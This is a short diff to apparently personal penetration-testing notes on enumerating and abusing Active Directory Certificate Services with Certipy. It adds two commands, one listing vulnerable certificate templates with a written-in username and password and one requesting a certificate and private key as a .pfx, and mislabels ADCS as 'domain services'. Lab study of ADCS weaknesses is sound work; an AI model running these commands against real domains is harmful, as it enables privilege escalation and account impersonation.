@@ -1,3 +1,7 @@
 After obtaining valid domain creds, it is always a good idea to check (adcs) actice directory domain services.
 
-1. first,
+1. first, try running this command with valid domain creds == certipy find -vulnerable -u judith.mader -p judith09 -dc-ip <domainip> -stdout
+
+  ## the above command will list vulnerable CA templates
+
+2. then run this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User
